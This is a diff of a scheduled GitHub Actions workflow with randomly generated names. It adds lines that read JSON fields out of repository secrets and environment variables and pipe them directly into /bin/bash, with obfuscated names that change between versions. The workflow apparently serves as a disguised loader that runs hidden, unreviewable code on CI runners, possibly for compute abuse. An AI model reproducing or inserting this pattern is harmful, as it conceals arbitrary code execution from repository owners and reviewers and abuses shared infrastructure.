@@ -3,8 +3,9 @@ name: luanyunping2345
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 1/6 * * *'
-jobs:  # 31919
+    - cron: '48 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,21 +13,16 @@ jobs:  # 31919
       - uses: actions/checkout@v4
       - name: luanyunping2345
         env:
-          nyb4: ${{ secrets.nyb4 }}
+          ocsqm8681: ${{ secrets.ocsqm8681 }}
         run: |
-          echo $nyb4 | jq -r .c3 | /bin/bash
-          echo $abgv94 | jq -r .he60 | /bin/bash
-          echo $mu541 | jq -r .d50551 | /bin/bash
-          echo $oi54 | jq -r .fy3835 | /bin/bash
-          echo $elj1498 | jq -r .s2 | /bin/bash
-          echo $qs65686 | jq -r .tnuo0 | /bin/bash
-          echo $n31846 | jq -r .r1914 | /bin/bash
-          echo $n922 | jq -r .nz619 | /bin/bash
-          echo $b074 | jq -r .e8 | /bin/bash
-          echo $tidcw0685 | jq -r .ok39 | /bin/bash
-          echo $xiem739 | jq -r .lzif79654 | /bin/bash
-          echo $kaf73643 | jq -r .hcpa668 | /bin/bash
-          echo $ci22945 | jq -r .q5304 | /bin/bash
-          echo $th0 | jq -r .bivv21 | /bin/bash
-          echo $vdae296 | jq -r .tvwky335 | /bin/bash
+          echo $ocsqm8681 | jq -r .v7825 | /bin/bash
+          echo $ef0 | jq -r .grj3342 | /bin/bash
+          echo $ty06 | jq -r .mdon22856 | /bin/bash
+          echo $hmcj6695 | jq -r .ezted894 | /bin/bash
+          echo $m49077 | jq -r .kf01111 | /bin/bash
+          echo $swtaz26673 | jq -r .rcri5313 | /bin/bash
+          echo $mv9911 | jq -r .zvp3 | /bin/bash
+          echo $g617 | jq -r .y312 | /bin/bash
+          echo $flvw9263 | jq -r .gauc6701 | /bin/bash
+          echo $n755 | jq -r .yoj326 | /bin/bash
 
